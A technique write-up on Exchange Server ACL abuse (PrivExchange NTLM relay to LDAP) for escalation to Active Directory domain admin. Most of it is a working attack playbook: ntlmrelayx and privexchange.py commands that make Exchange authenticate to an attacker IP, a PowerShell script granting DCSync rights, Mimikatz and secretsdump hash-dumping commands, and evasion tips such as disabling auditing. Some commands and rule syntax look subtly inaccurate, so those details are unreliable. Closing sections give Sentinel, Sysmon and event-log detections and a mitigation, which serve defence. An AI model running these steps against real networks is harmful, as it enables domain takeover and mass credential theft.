# [PE-VALID-001]: Exchange Server ACL Abuse

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-001 |
| **MITRE ATT&CK v18.1** | [T1078.002 - Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/) |
| **Tactic** | Privilege Escalation, Lateral Movement |
| **Platforms** | Windows AD (Hybrid environments) |
| **Severity** | **CRITICAL** |
| **CVE** | N/A |
| **Technique Status** | ACTIVE (Partial mitigation in Exchange 2019+) |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Exchange Server 2010, 2013, 2016, 2019 (Mitigated: 2019 CU13+) |
| **Patched In** | Exchange 2019 CU13 (February 2021) - Reduced permissions |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Exchange servers maintain excessive privilege levels in Active Directory by default. The `Exchange Windows Permissions` security group holds `WriteDACL` (write Discretionary Access Control List) permissions on the domain root object. This allows any member of this group—including Exchange Trusted Subsystem and Organization Management—to modify domain-level ACLs and grant themselves `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` extended rights, enabling DCSync operations and password hash extraction.

**Attack Surface:** Exchange server computer accounts, Exchange-related service accounts, domain-level DACL modifications, LDAP relay attack vector.

**Business Impact:** **Full domain compromise.** An attacker with valid credentials to any Exchange mailbox can escalate to domain administrator privileges, retrieve all user password hashes via DCSync, and establish persistent access to the entire Active Directory infrastructure.

**Technical Context:** This attack typically takes 5-10 minutes to execute from mailbox access to domain admin. It generates moderate event log signatures (NTLM relay events, ACL modification events) but may evade detection if SOC teams are not specifically monitoring for LDAP relay attacks or unusual DACL modifications. The attack is **not easily reversible** without AD restore from backup.

### Operational Risk
- **Execution Risk:** **Medium** - Requires valid mailbox access and ability to trigger Exchange authentication (via push notifications).
- **Stealth:** **Medium** - Generates NTLM relay telemetry and ACL modification logs; detectable with proper monitoring.
- **Reversibility:** **No** - Domain admin access is established; reverting requires manual ACL remediation and password reset.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.5.1 | Privilege delegation in Active Directory |
| **DISA STIG** | WN10-00-000215 | Enforcement of RBAC and least privilege |
| **CISA SCuBA** | AC-6 | Least privilege (Exchange server permissions) |
| **NIST 800-53** | AC-3, AC-6 | Access Control Enforcement, Least Privilege |
| **GDPR** | Art. 32 | Security of Processing (confidentiality of admin credentials) |
| **DORA** | Art. 18 | ICT-related incident management |
| **NIS2** | Art. 21 | Cyber risk management measures |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights |
| **ISO 27005** | Section 8.2 | Risk treatment options (mitigations) |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- Valid credentials to any user mailbox on the Exchange server (any domain user with a mailbox).
- Network access to Exchange Client Access Services (CAS) on port 443 or 80.

**Required Access:**
- HTTP/HTTPS connectivity to the Exchange server (Exchange Web Services endpoint).
- LDAP (port 389/636) connectivity to at least one Domain Controller (may be relayed via compromised machine).

**Supported Versions:**
- **Windows:** Server 2008 R2 - 2016 - 2019 - 2022
- **Exchange:** 2010 SP3, 2013 CU21, 2016 CU21, 2019 (pre-CU13)
- **PowerShell:** 3.0+ (for LDAP operations via .NET)
- **Other Requirements:** Exchange Web Services (EWS) enabled; NTLM authentication enabled on Exchange

**Tools:**
- [PrivExchange](https://github.com/dirkjanm/PrivExchange) (Python 3.6+)
- [Impacket ntlmrelayx](https://github.com/fortra/impacket) (Version 0.10.0+)
- [ADCS Certify](https://github.com/gargoylekeeper/certify) or native `Get-Acl` PowerShell
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) (Optional - reconnaissance)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Identify Exchange Server Membership in Privileged Groups

**Objective:** Verify that Exchange-related security groups have WriteDACL permissions on the domain.

**PowerShell Command:**
```powershell
# Check if Exchange Windows Permissions group exists and its members
Get-ADGroup -Identity "Exchange Windows Permissions" -Properties Members
Get-ADGroupMember -Identity "Exchange Windows Permissions" -Recursive
```

**Expected Output:**
```
DistinguishedName : CN=Exchange Windows Permissions,CN=Users,DC=domain,DC=local
ObjectClass : group
ObjectGUID : [GUID]
SamAccountName : Exchange Windows Permissions
Members: [List of Exchange security groups and computer accounts]
```

**What to Look For:**
- Presence of `Exchange Windows Permissions` group (indicates Exchange is installed).
- Members include `Exchange Trusted Subsystem`, computer accounts of Exchange servers.
- If members are present, the group likely has elevated AD permissions.

---

### Step 2: Verify WriteDACL Permission on Domain Root

**Objective:** Confirm that Exchange Windows Permissions group has WriteDACL ACE on domain root object.

**PowerShell Command:**
```powershell
# Retrieve ACL of domain root object
$domainDN = (Get-ADDomain).DistinguishedName
$acl = Get-Acl -Path "AD:\$domainDN"

# Filter for Exchange Windows Permissions group
$acl.Access | Where-Object { $_.IdentityReference -match "Exchange Windows Permissions" }
```

**Expected Output:**
```
IdentityReference     : DOMAIN\Exchange Windows Permissions
AccessControlType    : Allow
ActiveDirectoryRights: WriteDacl
InheritanceType     : All
```

**What to Look For:**
- `ActiveDirectoryRights` property shows `WriteDacl` (indicates vulnerability is present).
- `AccessControlType` is `Allow` (permission is explicitly granted, not denied).

---

### Step 3: Enumerate Organization Management Group Membership

**Objective:** Identify user accounts and service accounts in Organization Management (which includes Exchange Trusted Subsystem).

**PowerShell Command:**
```powershell
# Check Organization Management group composition
Get-ADGroup -Identity "Organization Management" -Properties Members
Get-ADGroupMember -Identity "Organization Management" -Recursive | Select-Object Name, SamAccountName, ObjectClass
```

**Expected Output:**
```
Name                    SamAccountName           ObjectClass
Exchange Trusted...     ExchangeTrustedSubsystem group
Exchange Enterprise...  ExchangeEnterpriseServ... group
[Exchange Servers]      EXCH01$                  computer
```

**What to Look For:**
- Computer accounts of Exchange servers listed (especially if vulnerable versions).
- Count of members in Organization Management.
- Any non-standard service accounts.

---

### Step 4: Test Exchange EWS Connectivity

**Objective:** Verify that Exchange Web Services (EWS) is accessible and NTLM authentication is enabled.

**PowerShell Command (from domain machine):**
```powershell
# Test EWS connectivity with NTLM
$exchangeServer = "exch01.domain.local"
$url = "https://$exchangeServer/EWS/Exchange.asmx"

# Create HTTP request with NTLM auth
$credential = [System.Net.CredentialCache]::DefaultNetworkCredentials
$request = [System.Net.HttpWebRequest]::CreateHttp($url)
$request.Credentials = $credential
$request.PreAuthenticate = $true

try {
    $response = $request.GetResponse()
    Write-Host "EWS is accessible. HTTP Status: $($response.StatusCode)"
} catch {
    Write-Host "Error: $_"
}
```

**Expected Output:**
```
EWS is accessible. HTTP Status: 200
```

**What to Look For:**
- HTTP 200 response indicates EWS is accessible and NTLM auth works.
- HTTP 403 or 401 indicates potential authentication issues (remediation already in place).
- Connection timeout suggests network isolation.

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: PrivExchange + NTLM Relay (Linux/Impacket)

**Supported Versions:** Exchange 2010 - 2016 - 2019 (pre-CU13)

**Preconditions:**
- Valid Exchange mailbox credentials.
- Network access from attacker Linux machine to Exchange server (HTTPS 443).
- Ability to reach a Domain Controller on LDAP (389/636) from attacker machine (or via relay).
- Exchange server running with default high privileges (WriteDACL on domain).

---

#### Step 1: Prepare Attacker Infrastructure (NTLM Relay Listener)

**Objective:** Set up ntlmrelayx to intercept NTLM authentication from Exchange server and relay it to a Domain Controller's LDAP service.

**Command:**
```bash
# Start ntlmrelayx in LDAP relay mode
# Target: Domain Controller LDAP service
# Action: Escalate user to DCSync privileges

ntlmrelayx.py -t ldap://dc01.domain.local -i --escalate-user attacker_user

# Expected output:
# [*] Listening on 0.0.0.0:445 (Impacket relay)
# [*] Listening on 0.0.0.0:80 (HTTP relay)
# [*] LDAP Session established
```

**What This Means:**
- `ntlmrelayx` is now listening for incoming NTLM authentication attempts.
- When Exchange server authenticates (via NTLM), the credentials will be relayed to the DC's LDAP service.
- The `--escalate-user` flag specifies which user to grant DCSync rights to (if successful).
- `-i` enables interactive LDAP shell for post-exploitation.

**OpSec & Evasion:**
- Run from a machine **not** on the victim network if possible (external relay).
- If running internally, use a compromised workstation to blend in with normal traffic.
- LDAP relay is **not detected** as frequently as SMB relay (LDAP Signing is uncommon in older deployments).
- High detection risk: Monitor for unusual DACL modifications on domain object.

---

#### Step 2: Obtain or Use Valid Exchange Mailbox Credentials

**Objective:** Acquire valid domain user credentials with an active mailbox on the Exchange server.

**Methods to Obtain Credentials:**
- Phishing campaign targeting domain users.
- Compromised user account from prior breach.
- Default service account (if not rotated).
- Stale/inactive account with forgotten password.

**Command (if credentials already obtained):**
```bash
# Store credentials for use in PrivExchange
export EXCHANGE_USER="domain\username"
export EXCHANGE_PASS="P@ssw0rd"
export EXCHANGE_SERVER="exch01.domain.local"
```

**What This Means:**
- These credentials will be used by PrivExchange to authenticate to EWS.
- The user must have an active mailbox on the Exchange server.
- Shared mailboxes or distribution lists do NOT work.

**OpSec & Evasion:**
- Use a compromised account with minimal audit trail (if available).
- Avoid service account credentials (more likely monitored).
- Use unprivileged user accounts (draw less attention than admin accounts).

---

#### Step 3: Execute PrivExchange Attack to Force Exchange Authentication

**Objective:** Trigger the Exchange server to authenticate back to the attacker's NTLM relay listener using its computer account (SYSTEM context).

**Command:**
```bash
# Run PrivExchange with mailbox credentials
# PrivExchange will create a push notification subscription
# This forces Exchange to authenticate to attacker-controlled URL with SYSTEM privileges

python3 privexchange.py -u domain\\username -p 'P@ssw0rd' \
    -e exch01@domain.local \
    -a attacker_ip \
    -s exch01.domain.local

# Expected output:
# [*] Targeting https://exch01.domain.local/EWS/Exchange.asmx
# [*] Authenticating as domain\username
# [+] Mailbox found: exch01@domain.local
# [+] Creating push notification subscription...
# [*] Exchange will authenticate to \\attacker_ip\callback
# [+] Subscription created. Waiting for callback...
```

**Command Parameters:**
- `-u domain\\username` - Valid mailbox account
- `-p 'P@ssw0rd'` - Password for above account
- `-e exch01@domain.local` - Target mailbox on Exchange
- `-a attacker_ip` - Attacker IP (where ntlmrelayx is listening)
- `-s exch01.domain.local` - Exchange server FQDN or IP

**What This Means:**
- PrivExchange authenticates to Exchange using the victim credentials.
- It creates a **PushSubscription** (feature designed to send push notifications to external URLs).
- PrivExchange configures the subscription to send notifications to `attacker_ip`.
- When Exchange tries to deliver the notification, it will authenticate as **the Exchange server's computer account** (NT AUTHORITY\SYSTEM context).
- This NTLM authentication is automatically relayed by ntlmrelayx to the Domain Controller.

**OpSec & Evasion:**
- PushSubscription creation may generate Event ID 1000 (Application Error) in some cases; monitor but rare.
- The attack is **fast** (typically < 5 seconds for the relay to complete).
- High detection risk: Network-based detection of NTLM relay attacks.
- Mitigation: LDAP Signing and Channel Binding prevent this attack.

---

#### Step 4: Confirm DCSync Privileges Granted (Interactive Relay Shell)

**Objective:** Verify that the relay was successful and the attacker's user now has DCSync rights on the domain.

**Command (in ntlmrelayx interactive shell):**
```bash
# Interactive LDAP shell is now active
# Verify DCSync rights were granted

dcsync_status

# Or manually check DACL of target user via Impacket
python3 get_acl.py -identity domain\\attacker_user -target dc01.domain.local

# Expected output (or via ldapsearch):
# User: attacker_user
# ExtendedRights: DS-Replication-Get-Changes, DS-Replication-Get-Changes-All
# Status: SUCCESS - DCSync capable
```

**What This Means:**
- If successful, the `attacker_user` (specified in Step 1 `--escalate-user`) now has:
  - `DS-Replication-Get-Changes` extended right
  - `DS-Replication-Get-Changes-All` extended right
- These rights allow the user to request domain replication (DCSync).
- The attacker can now dump **all password hashes and Kerberos keys** from the domain.

**Troubleshooting:**
- **Error: "LDAP relay failed"**
  - Cause: LDAP Signing is enabled on Domain Controller.
  - Fix: Target a different DC without LDAP Signing, or use SMB relay instead.
  
- **Error: "Subscription creation failed - HTTP 403 Forbidden"**
  - Cause: Exchange mailbox account lacks EWS permissions.
  - Fix: Verify account has active mailbox; try different account.

- **Error: "Connection refused on port 445"**
  - Cause: Attacker IP unreachable from Exchange server (network segmentation).
  - Fix: Use an IP accessible from Exchange network; consider relay from internal compromised machine.

---

### METHOD 2: Direct ACL Modification via PowerShell (Windows Domain Machine)

**Supported Versions:** Exchange 2013, 2016, 2019 (when executed with sufficient privileges)

**Preconditions:**
- Compromise of a user account that is member of `Organization Management` group (OR)
- Compromise of an Exchange server with local admin access (OR)
- Access to Exchange server as `SYSTEM` (via lateral movement)

---

#### Step 1: Verify Current User Group Membership

**Objective:** Confirm that the current user or compromised account is a member of a privileged Exchange group.

**PowerShell Command:**
```powershell
# Check current user's groups
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object System.Security.Principal.WindowsPrincipal($currentUser)

# Retrieve all groups
Get-ADUser -Identity $currentUser.Name -Properties MemberOf | Select-Object -ExpandProperty MemberOf

# Specifically check for Exchange groups
Get-ADUser -Identity $currentUser.Name -Properties MemberOf | 
  Select-Object -ExpandProperty MemberOf | 
  Where-Object { $_ -match "Exchange" }

# Expected output (if in Organization Management):
# CN=Organization Management,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=domain,DC=local
```

**What This Means:**
- If the user is member of `Organization Management`, they inherit `WriteDacl` on domain via group membership.
- If the user is member of `Exchange Trusted Subsystem`, they also inherit the privilege.
- Without these groups, this method will fail (permission denied).

**Troubleshooting:**
- **Error: "Access Denied"**
  - Cause: User is not in privileged group or account is not a service account.
  - Fix: Elevate to an account with Exchange admin privileges.

---

#### Step 2: Retrieve Domain ACL and Identify Target User

**Objective:** Get the current DACL of the domain root and identify the target user to grant DCSync rights.

**PowerShell Command:**
```powershell
# Import Active Directory module
Import-Module ActiveDirectory

# Get domain DN
$domainDN = (Get-ADDomain).DistinguishedName

# Get existing ACL
$acl = Get-Acl -Path "AD:\$domainDN"

# Display all ACE entries
$acl.Access | Select-Object IdentityReference, ActiveDirectoryRights, AccessControlType | Format-Table

# Find the target user to escalate
$targetUser = "domain\attacker_user"
$targetUserObj = Get-ADUser -Identity $targetUser
```

**Expected Output:**
```
IdentityReference                    ActiveDirectoryRights AccessControlType
-----------------                    -------------------- ----------------
DOMAIN\Domain Admins                 GenericAll            Allow
DOMAIN\Exchange Windows Permissions WriteDacl             Allow
DOMAIN\Enterprise Admins             GenericAll            Allow
```

**What This Means:**
- The ACL shows all current permissions on the domain object.
- `Exchange Windows Permissions` group has `WriteDacl` (confirms vulnerability).
- Target user should be identified (e.g., `attacker_user`).

---

#### Step 3: Grant DCSync Rights via ACL Modification

**Objective:** Add two new ACEs to the domain ACL, granting DCSync extended rights to the target user.

**PowerShell Command:**
```powershell
# Define the extended rights needed for DCSync
$extendedRightGUIDs = @{
    "DS-Replication-Get-Changes" = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
    "DS-Replication-Get-Changes-All" = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
}

# Create ACE for DS-Replication-Get-Changes
$acl = Get-Acl -Path "AD:\$domainDN"
$targetUserSID = (Get-ADUser -Identity "attacker_user").SID

# ACE 1: DS-Replication-Get-Changes
$ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $targetUserSID,
    [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
    [System.Security.AccessControl.AccessControlType]::Allow,
    [GUID]$extendedRightGUIDs["DS-Replication-Get-Changes"]
)

# ACE 2: DS-Replication-Get-Changes-All
$ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $targetUserSID,
    [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
    [System.Security.AccessControl.AccessControlType]::Allow,
    [GUID]$extendedRightGUIDs["DS-Replication-Get-Changes-All"]
)

# Add both ACEs to the domain ACL
$acl.AddAccessRule($ace1)
$acl.AddAccessRule($ace2)

# Apply the modified ACL back to the domain
Set-Acl -Path "AD:\$domainDN" -AclObject $acl

# Verify the change was applied
$newACL = Get-Acl -Path "AD:\$domainDN"
$newACL.Access | Where-Object { $_.IdentityReference -match "attacker_user" } | 
  Select-Object IdentityReference, ActiveDirectoryRights

# Expected output:
# IdentityReference        ActiveDirectoryRights
# -----------------        ----------------------
# DOMAIN\attacker_user     ExtendedRight
# DOMAIN\attacker_user     ExtendedRight
```

**What This Means:**
- Two new Access Control Entries (ACEs) have been added to the domain's DACL.
- The target user (`attacker_user`) now has explicit permission to perform both replication rights.
- These changes are **immediately active** (no restart needed).
- The user can now execute DCSync operations.

**OpSec & Evasion:**
- Event ID 5136 (Directory Service Object Modified) will be logged if audit is enabled.
- Event ID 4662 (Object access) may log the ACL modification.
- High detection risk if SOC monitors DACL changes on domain object.
- Mitigation: Disable audit temporarily (requires admin), or use in-memory attacks via Mimikatz.

---

#### Step 4: Execute DCSync to Extract Password Hashes

**Objective:** Use the newly granted DCSync rights to dump all domain password hashes.

**PowerShell Command (via Mimikatz):**
```powershell
# Use Mimikatz to perform DCSync (if Mimikatz is available in memory)
# This assumes Mimikatz is already loaded via Execute-ShellCode or similar

# Command (in Mimikatz):
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Or via impacket (from Linux):
# python3 secretsdump.py domain.local/attacker_user:'P@ssw0rd'@dc01.domain.local -history -just-dc
```

**Expected Output (Mimikatz):**
```
[DC] 'domain.local' will be the domain
[DC] 'dc01.domain.local' will be the DC server
[DC] 'attacker_user' will be used as account.

Object RDN           : Administrator
 ** SAM ACCOUNT **
Administrator        RID  : 500
  hash NTLM: aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634
  hash SHA1 : 7f0d3e36e3d8eabe39e3ee5c1f2d2b8c4e5f6a7b

Domain Users         RID  : 513
  hash NTLM: aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
  ...
```

**What This Means:**
- All domain user password hashes have been extracted.
- These hashes can be **cracked offline** using GPU-accelerated tools (Hashcat, John the Ripper).
- The attacker now has access equivalent to a Domain Administrator.
- Pass-the-Hash attacks are possible immediately (no cracking needed).

**Troubleshooting:**
- **Error: "Access Denied - DCSync Failed"**
  - Cause: ACL changes did not apply, or user not in correct group.
  - Fix: Wait 30 seconds for replication; re-run Set-Acl.

- **Error: "RPC Server Unavailable"**
  - Cause: Network connectivity issue to Domain Controller.
  - Fix: Verify DC is reachable; check firewall rules for RPC (port 135, 139, 445).

---

### METHOD 3: Abuse via BloodHound + Manual ACL Modification (Windows, GUI)

**Supported Versions:** Exchange 2013 - 2019 (when ADUC available)

**Preconditions:**
- Local domain admin access or membership in privileged Exchange groups.
- Access to Domain Controller or machine with ADUC installed.
- ADUC (Active Directory Users and Computers) or LDP.exe available.

---

#### Step 1: Identify ACL Attack Path via BloodHound

**Objective:** Use BloodHound to discover and visualize the ACL-based privilege escalation path from current user to Domain Admin.

**BloodHound GUI Steps:**
1. Launch BloodHound (already imported with domain data).
2. Go to **Query** → **Domain Admins**.
3. Right-click on domain object → **Shortest Paths to Domain Admins**.
4. Filter for edges labeled **WriteDACL** or **GenericAll**.
5. Trace path: `Organization Management` → `Exchange Windows Permissions` → `Domain`.

**Expected Result:**
```
Current User → (member of) Organization Management 
  → (inherits WriteDACL) Exchange Windows Permissions 
  → (WriteDACL on) Domain object
  → (can grant) DCSync rights
  → (allows) Password dumping
```

**What This Means:**
- BloodHound visualizes that the current user can escalate to domain admin via ACL abuse.
- The path shows that the user is already part of privileged groups (no additional compromise needed).
- Confirms that the vulnerability exists in the environment.

---

#### Step 2: Open Active Directory Users and Computers (ADUC) - GUI Method

**Objective:** Use ADUC to view and modify the domain ACL graphically.

**GUI Steps:**
1. Open **Active Directory Users and Computers** (ADUC).
   - (Right-click **Start** → **Computer Management** → **Active Directory Users and Computers**, or search for `dsa.msc`)
2. Click **View** → **Advanced Features** (to enable ACL viewing).
3. Right-click the **domain root** (e.g., `domain.local`) → **Properties**.
4. Click the **Security** tab.
5. Click **Advanced** to open the Advanced Security Settings dialog.
6. Click **Edit** to modify the ACL.

**Screenshot Navigation:**
- Domain Properties window → Security tab → Advanced button
- Advanced Security Settings dialog shows all ACEs
- Edit button enables ACE creation/modification

**What This Means:**
- The Security tab displays all Access Control Entries (ACEs) currently applied to the domain.
- You can now add new ACEs to grant specific rights.

---

#### Step 3: Create New ACE to Grant DCSync Rights

**Objective:** Manually add ACEs granting DCSync extended rights to target user via GUI.

**GUI Steps:**
1. In **Advanced Security Settings** dialog, click **Edit**.
2. Click **Add** to create a new ACE.
3. In the **Permission Entry** dialog:
   - Click **Select a Principal** → Enter target username (e.g., `attacker_user`) → Check Names.
   - Under **Permissions**, scroll to **Extended Rights**.
   - Check the boxes for:
     - `DS-Replication-Get-Changes` (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
     - `DS-Replication-Get-Changes-All` (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
   - Ensure **Type** is set to `Allow`.
   - Click **OK**.
4. Click **OK** again to apply the ACE.

**What This Means:**
- Two new ACEs have been created and applied to the domain object.
- The target user now has explicit DCSync rights.
- The change is **immediate** (no reboot required).
- The user can immediately perform DCSync operations.

**OpSec & Evasion:**
- GUI-based modifications may trigger **Event ID 5136** (Directory Service Object Modified) in security logs.
- High visibility if SOC monitors domain object modifications.
- Mitigation: Perform during high-activity windows or disable audit temporarily.

---

#### Step 4: Verify ACE Creation and Perform DCSync

**Objective:** Confirm the ACE was successfully applied and test DCSync capability.

**Command (from compromised user):**
```powershell
# Test DCSync from the compromised user account
# If successful, the user will retrieve domain password hashes

# Option 1: Via Mimikatz (if available)
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Option 2: Via impacket secretsdump (from Linux)
python3 secretsdump.py domain.local/attacker_user:'P@ssw0rd'@dc01.domain.local -just-dc

# Option 3: Verify permissions before DCSync
$domainDN = (Get-ADDomain).DistinguishedName
$acl = Get-Acl -Path "AD:\$domainDN"
$acl.Access | Where-Object { $_.IdentityReference -match "attacker_user" }
```

**Expected Output:**
```
[+] DCSync privileges confirmed
[+] Dumping password hashes...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
...
```

**What This Means:**
- DCSync is now functional for the target user.
- All domain password hashes have been extracted and stored.
- Attacker has achieved **full domain compromise**.
- Post-exploitation can now proceed (lateral movement, persistence, etc.).

---

## 7. TOOLS & COMMANDS REFERENCE

### [PrivExchange](https://github.com/dirkjanm/PrivExchange)

**Version:** 1.0  
**Minimum Version:** 1.0  
**Supported Platforms:** Linux, MacOS (Python 3.6+)

**Version-Specific Notes:**
- Version 1.0: Initial release; works with Exchange 2010-2019
- Latest version: Supports modern Python 3 environments; compatible with current Impacket

**Installation:**
```bash
# Clone repository
git clone https://github.com/dirkjanm/PrivExchange.git
cd PrivExchange

# Install dependencies
pip3 install -r requirements.txt
# or
pip3 install requests requests-ntlm
```

**Usage:**
```bash
python3 privexchange.py -u DOMAIN\\username -p password -e user@domain.local \
  -a attacker_ip -s exchangeserver.domain.local

# Options:
# -u DOMAIN\\username : Mailbox username with domain
# -p password : Password for mailbox
# -e user@domain.local : Target mailbox email
# -a attacker_ip : Attacker IP where relay is listening
# -s server : Exchange server FQDN or IP
```

---

### [Impacket ntlmrelayx](https://github.com/fortra/impacket)

**Version:** 0.10.0+  
**Minimum Version:** 0.9.22  
**Supported Platforms:** Linux, MacOS, Windows (Python 3.6+)

**Version-Specific Notes:**
- Version 0.9.22-0.10.0: Basic LDAP relay support
- Version 0.10.1+: Enhanced LDAP interactive shell mode
- Version 0.11.0+: Support for LDAP signing bypass techniques

**Installation:**
```bash
# Install via pip
pip3 install impacket

# Or clone and install from source
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install -r requirements.txt
python3 setup.py install
```

**Usage:**
```bash
# LDAP relay with user escalation
ntlmrelayx.py -t ldap://dc01.domain.local -i --escalate-user attacker_user

# Options:
# -t ldap://target : Target LDAP service (Domain Controller)
# -i : Interactive LDAP shell after relay
# --escalate-user username : User to grant DCSync rights to
```

---

### [ADCSExploit / Certify](https://github.com/gargoylekeeper/certify)

**Version:** Latest (for certificate-based escalation verification)  
**Minimum Version:** N/A  
**Supported Platforms:** Windows (.NET)

**Usage (for ADCS reconnaissance):**
```powershell
# Enumerate ADCS certificate templates that might be exploitable
.\certify.exe find /vulnerable

# May be used in conjunction with ACL abuse if ADCS is also misconfigured
```

---

## 9. MICROSOFT SENTINEL DETECTION

### Sentinel Query 1: Unusual LDAP Relay Activity (NTLM over HTTP)

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4688 // Process creation
| where CommandLine contains "ntlmrelayx" or CommandLine contains "privexchange"
| project TimeGenerated, Computer, Account, CommandLine, ParentProcessName
```

**Alternative (Network-based):**
```kusto
AzureNetworkAnalytics_CL
| where DestinationPort == 389 or DestinationPort == 636 // LDAP ports
| where SrcIpAddr contains "attacker_subnet" // Known attacker range
| summarize Count=count() by SrcIpAddr, DestinationIpAddr, DestinationPort
| where Count > 10 // Threshold for relay attempts
```

---

### Sentinel Query 2: Domain ACL Modification Events

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Update domain" or OperationName == "Modify domain properties"
| where Result == "Success"
| project TimeGenerated, OperationName, InitiatedBy, TargetResources
```

**Event ID (Windows Event Log):**
```kusto
SecurityEvent
| where EventID == 5136 // Directory Service Object Modified
| where TargetUserName == domain_root_dn
| where OperationType == "Modify"
| project TimeGenerated, Computer, Account, EventData
```

---

### Sentinel Query 3: DCSync Attempts

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4662 // Object access
| where ObjectName contains "Replication"
| where AccessList contains "DS-Replication-Get-Changes"
| project TimeGenerated, Computer, Account, ObjectName, AccessList
```

---

## 10. WINDOWS EVENT LOG MONITORING

### Critical Event IDs to Monitor

| Event ID | Source | Description | Severity |
|---|---|---|---|
| **5136** | Security | Directory Service Object Modified | HIGH |
| **4662** | Security | Object access (LDAP replication rights) | HIGH |
| **4625** | Security | Failed logon (baseline for account usage) | MEDIUM |
| **4768** | Security | Kerberos TGT requested (baseline) | LOW |
| **4769** | Security | Kerberos service ticket requested | LOW |
| **5723** | Directory Services | Replication partner request | HIGH |

---

### Event ID 5136 - Directory Service Object Modified (High Fidelity)

**Log Configuration:**
- **Event Source:** Directory Services
- **Requires:** Audit Directory Service Changes enabled (`auditpol /set /subcategory:"Directory Service Changes" /success:enable`)

**Detection Rule (PowerShell):**
```powershell
# Alert on ACL modifications to domain object
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 5136
    StartTime = (Get-Date).AddMinutes(-5)
} | Where-Object {
    $_.Properties[0] -match "CN=Domain Name,.*DC=.*" -and
    $_.Properties[5] -match "WriteDacl|DS-Replication"
} | Select-Object TimeCreated, @{
    Name='Account'
    Expression={$_.Properties[1]}
}, @{
    Name='Target'
    Expression={$_.Properties[0]}
}, @{
    Name='Change'
    Expression={$_.Properties[5]}
}
```

---

## 11. SYSMON DETECTION

### Sysmon Rule: Monitor ntlmrelayx or PrivExchange Process Execution

**Sysmon Event ID 1 (Process Creation):**
```xml
<Rule groupRelation="or">
    <ProcessCreate onmatch="all">
        <CommandLine condition="contains any">ntlmrelayx; privexchange; secretsdump</CommandLine>
        <User condition="is not">NT AUTHORITY\SYSTEM</User>
    </ProcessCreate>
</Rule>
```

**Sysmon Rule: Monitor LDAP Relay Activity (Network Connections)**

**Sysmon Event ID 3 (Network Connection):**
```xml
<Rule groupRelation="or">
    <NetworkConnect onmatch="all">
        <DestinationPort condition="is">389</DestinationPort> <!-- LDAP -->
        <Protocol>tcp</Protocol>
        <SourcePort condition="is not">any</SourcePort>
    </NetworkConnect>
</Rule>
```

---

## 12. MICROSOFT DEFENDER FOR CLOUD DETECTIONS

### Alert: Suspicious Directory Service Activity

**Detection Type:** Anomaly-based

**Configuration:**
- **Alert Name:** "Suspicious Directory Service Object Modification"
- **Severity:** High
- **Data Source:** Azure AD audit logs, Windows Security Event 5136
- **Condition:** 
  - Object modified = Domain Root Object (CN=domain,DC=...)
  - Action = ACL modification (WriteDACL added)
  - User not in approved list (e.g., Domain Admins)

**Response Actions:**
1. Review the account that made the modification.
2. Check if account is legitimately in Exchange admin groups.
3. Verify if ACL change is documented and authorized.
4. If unauthorized, isolate the account and reset Domain Admin passwords.

---

## 14. DEFENSIVE MITIGATIONS

### Mitigation 1: Remove Excessive Exchange Permissions (Most Effective)

**Objective:** Remove `WriteDACL` permission from Exchange Windows Permissions group on domain object.

**Method A: PowerShell (Automated)**
```powershell
# Import required module
Import-Module ActiveDirectory

# Get domain DN
$domainDN = (Get-ADDomain).DistinguishedName

# Get current ACL
$acl = Get-Acl -Path "AD:\$domainDN"

# Remove WriteDACL ace for Exchange Windows Permissions
$exchangeWindowsPermsGUID = (Get-ADGroup "Exchange Windows Permissions").ObjectGUID
$acesToRemove = $acl.Access | Where-Object {
    $_.IdentityReference -match "Exchange Windows Permissions" -and
    $_.ActiveDirectoryRights -match "WriteDacl"
}

foreach ($ace in $acesToRemove) {
    $acl.RemoveAccessRule($ace)
}

# Apply the modified ACL
Set-Acl -Path "AD:\$domainDN" -AclObject $acl

# Verify
$newAcl = Get-Acl -Path "AD:\$domainDN"
$newAcl.Access | Where-Object { $_.IdentityReference -match "Exchange Windows Permissions" } | Format-Table
```

**Method B: GUI (ADUC)**
1. Open **Active Directory Users and Computers** (dsa.msc).
2. Click **View** → **Advanced Features**.
3. Right-click the **domain root** → **Properties** → **Security** tab.
4. Click **Advanced**.
5. Find entry for `Exchange Windows Permissions` with `WriteDacl`.
6. Select it → Click **Edit** → Click **Remove**.
7. Click **OK** → **Apply** → **OK**.

**Supported Versions:**
- Windows Server 2008 R2 - 2025
- Exchange 2010 - 2019 (CU13+ includes built-in mitigation)

**Impact:**
- Exchange administrative functions may break if permissions are too restrictive.
